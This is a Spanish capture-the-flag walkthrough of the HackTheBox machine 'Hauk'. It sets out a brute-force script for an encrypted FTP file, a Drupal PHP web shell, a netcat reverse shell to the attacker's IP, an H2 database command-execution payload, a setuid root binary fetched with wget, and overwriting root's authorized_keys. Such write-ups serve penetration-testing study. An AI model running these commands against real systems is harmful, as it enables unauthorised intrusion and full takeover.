---
title: "Hauk - HTB | by ils00"
author: ils00
categories: [HackTheBox, Medium]
tags: [web, ftp, pivoting, bash, database]
render_with_liquid: false
media_subpath: /img_p/hauk_htb
image:
  path: logo.png
---

Esta es una manera sencilla de resolver la máquina **Hauk** de **HackTheBox** con categoría **Media** en la plataforma.

![](maquina.png)



## Conocimientos Previos:

- Escaneo de puertos con NMAP
- FTP Básico
- Descifrado de Ficheros
- Bash scripting
- Fundamentos Web
- Fundamentos Base de Datos 
- Pivoting / Tunneling

Después de saber todo esto, vamos a comenzar!!!

**** ESPERAR 5 MINUTOS ANTES DE EMPEZAR CON LOS ESCANEOS ****

Creamos una jerarquía de directorios para poder tenerlo todo organizado.

![](jerarquia.png)



## Escaneo de Puertos:

Primeramente, lanzamos una traza ICMP hacía la máquina víctima para ver si nos responde.

![](ping.png)

Como podemos ver el TTL, nos muestra que es una máquina Linux, debido a que tiene un TTL similar a 64.

Vamos a lanzar el primer escaneo de nmap que nos dará una vista mas o menos de a que nos estamos enfrentando.

`nmap -p- --open -sS -Pn -n --min-rate 2500 10.129.95.193 -oN AllPorts`

![](nmap.png)

Vemos que tenemos varios puertos abiertos, vamos a lanzar uno mas exhaustivo.

![](nmap1.png)

Ahora que tenemos los escaneos empezamos con el análisis. 



## Explotación I:

Empezamos por el **FTP:**

![](ftp.png)

Según el escaneo nos podemos meter como anónimo en el servicio.

![](ftp1.png)

Efectivamente, estamos dentro y podemos ver un directorio llamado **messages**.

![](ftp2.png)

Dentro de este directorio podremos ver un fichero llamado **.drupal.txt.enc.**

Hacemos un **get** para traerlo a la máquina y vemos que tiene el nombre del CMS al que nos estamos enfrentando, a lo mejor podremos ver alguna pista.

Dentro de él tenemos esto:

```console
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb  
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz  
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy  
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
```

Al parecer está en **base64.**

![](file.png)

Efectivamente, tenemos el fichero encodeado en base64 y al parecer es algo que tiene que ver con el **openssl**.

Vamos a intentar romper la contraseña, lo haremos de la siguiente manera.

De manera local vamos a realizar un script para poder sacar la contraseña correcta.

`openssl enc -d -aes-256-cbc -in drupal.txt.enc -out salida.txt -pass pass:CANDIDATA`

Esta es la instrucción que vamos a utilizar, ahora vamos a construir un script el cual pruebe varias hasta que uno de con el resultado.

```console
#!/bin/bash

while read PASS; do

openssl enc -d -a -AES-256-CBC -in drupal.txt.enc -out decrypted.txt -pass pass:"$PASS" 2>/dev/null

if [ $? -eq 0 ]; then 
echo "[+] La contraseña correcta es: $PASS"  
 break

fi

done < /usr/share/wordlists/rockyou.txt
```



Este script automatiza el proceso de descifrado del archivo cifrado con OpenSSL que utilizando un ataque de fuerza bruta con el diccionario **rockyou.txt** que contiene posibles contraseñas.

El script básicamente empieza un bucle que lee el diccionario, en este caso **rockyou.txt**, y lo guarda en la variable **PASS**.

Seguidamente ejecuta el comando e intenta descifrar el archivo **drupal.txt.enc** usando la contraseña almacenada en la variable **PASS**.

Por último, comprueba si el último comando terminó con éxito (código 0 significa éxito), si la contraseña funciona, imprime la contraseña correcta y termina el bucle ya que encontró la contraseña, si no continua con la siguiente.

Ejecutamos el script y…

![](password.png)

Como podemos ver la contraseña correcta es “friends” ahora podemos descifrar el contenido.

`openssl enc -d -a -aes-256-cbc -in drupal.txt.enc -k friends`

![](nota.png)

Aquí tenemos algo que nos puede servir, al parecer es una contraseña y también tenemos un usuario, el cual nos podría servir después.

Como dice la nota, vamos a probar la contraseña en el portal.

Probé → **admin:PASS**

![](web.png)

Aquí tenemos todo listo para ver si podemos entrar a la máquina y empezar la siguiente escalada.



## Explotación II:

Empecé a buscar información en internet y a buscar por los registros visibles y pude encontrar la versión de **Drupal** que estaba corriendo. Estaba ubicado el el fichero **CHANGELOG.txt.**

![](version.png)

**Drupal 7.44** voy a ver que puedo encotrar para explotar esta versión.

Tras muchas pruebas añadiendo y que me los convierta en html he descubierto un **módulo** en el apartado **módulos** de la página.

![](weeb2.png)

El **PHP Filter** aparece desactivado si lo activas ahora cuando añades un blog puede llegar a interpretar el código que le pongas por lo que yo le voy a pasar la shell one liner de php.

Para ello iremos a:

![](web3.png)

![](web4.png)

![](web5.png)

<?php  

system($_GET[VARIABLE]);  

?>

![](web6.png)

Ahora como podemos ver si que esta habilitado, por lo que introduciremos la shell.

![](web7.png)

Llamamos a la variable “hola” en mi caso con el comando id.

Analizando el contenido me he dado cuenta que tienen **mysql** y he dado con el usuario y la contraseña del servicio.

![](password1.png)

Estaba ubicada en la ruta:

` /var/www/html/sites/default/settings.php`

Vamos a usar lo mismo que hemos usado antes para generar comandos arbitrarios, pues lo usaremos para mandarlos una shell a nuestra máquina de atacante.

Generamos una nueva página con el siguiente contenido:

```console
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.156 9001 >/tmp/f'); ?>
```



Nos ponemos en escucha por el puerto que hemos elegido en la shell y…

![](escucha9000.png)

Estamos dentro.



## Escalada I:

Primeramente, comprobamos que estamos en la máquina victima.

![](ip.png)

Efectivamente, estamos dentro así que podemos comenzar con la escalada.

Como anteriormente, hemos visto usuario y contraseña del servicio mysql vamos a probarlas a ver si tenemos acceso:

`mysql -h localhost -u drupal -p PASS`

Dentro de aquí no he encontrado anda en claro.

Por lo que probé la contraseña con el usuario Daniel y…

![](id.png)

Estamos dentro del usuario Daniel, pero con una interfaz de python, pero que es fácil de escapar de ella.

`import subprocess ` 
`subprocess.call('/bin/bash', shell=True)`

Mediante estos comandos escapamos del lenguaje y volvemos a tener una shell normal.

Ahora lo que hice yo es meterme por el protocolo **ssh** para tener una shell más potente.

Puse esto una vez arrancada la shell y ya no tenía posibilidad de que se me cerrara.

`import pty;pty.spawn('/bin/bash')`

![](daniel.png)



## Escalada II:

Como sabemos desde un primer momento se está ejecutando una base de datos llamada **H2** a la cual podemos acceder por el navegador pero no nos muestra nada en claro.

Investigando un poco encontré un proceso.

![](psaux.png)

Ahora mediante un túnel con el protocolo ssh decidí túnelizar la conexión de la máquina víctima con la mia de atacante.

`ssh danuel@10.129.95.192 -L 8082:localhost:8082`

![](h2.png)

Si busco localhost y el puerto es como si estuviera en mi máquina atacante, de esta manera:

![](maps.png)

Básicamente, si yo abro el localhost en mi maquina es como si lo estuviera abriendo en el localhost de la máquina víctima.

Yo en esta parte de la escalada tiré un poco de lógica y cambie el nombre de la base de datos de “test” a “drupal”.

![](h2_1.png)

Me dio acceso.

Finalmente, lo que hice fue buscar por internet posibles payloads a ver si podía ejecutar comandos.

```console
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; }$$;  
CALL SHELLEXEC('whoami')
```



Usé este y me funcionó perfectamente, empecé a enumerar y a intentar a ver si podía ganar acceso.



## Root I:

Una de las maneras que conseguí fue compilar un binario stuid para ejecutarlo en el servidor. Para ello haremos lo siguiente:

![](binario.png)

```console
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
int main(int argc, char *argv[]) {  
 setreuid(0, 0);  
 execve("/bin/sh", NULL, NULL);  
}
```



Una vez creado lo compilamos:

`gcc -o NOMBRE_BINARIO_SALIDA BINARIO_ENTRADA`

Nos creamos un servidor en python para mandarlo a la máquina víctiam de la siguiente manera.

`python3 -m http.server 5050`

`CALL SHELLEXEC('wget -O /tmp/.root_shell http://10.10.14.42:50/shell');`

Encontré un comando más corto y más funcional a mi parecer.

![](root.png)

Una vez subido le elevamos los permisos, con permisos SUID.

`chmod 4775 /tmp/.root_shell`

![](root1.png)

Y ya somos ROOT!!!



## Root II:

Hay una forma mas sencilla que me di cuenta después de realizar la anterior.

`CALL SHELLEXEC('wget -O /root/.ssh/authorized_keys http://10.10.14.42:5050/id_rsa.pub');`

Con este comando estoy lanzando, desde la máquina donde se ejecuta (la víctima), que descargue desde mi máquina (el atacante) una clave pública SSH y la guarde como **authorized_keys**, dándome acceso remoto como root.

![](root_full.png)

Y desde mi máquina atacante tengo acceso con un simple ssh a la máquina víctima, por lo que puedo sacar la clave de root.

![](root_flag.png)



## **Conclusión:**

Esta es una máquina de nivel medio muy interesante que toca muchos conceptos pero a la vez sencillos de resolver, esta todo en foros y en páginas de divulgación en internet. Me ha llevado un total de **6h** completarla entera, claramente haciendo paradas. Por lo demás maquina muy divertida y recomendada para la practica para certificaciones.



Un saludo, GOOD HACKING!!!



> XIII
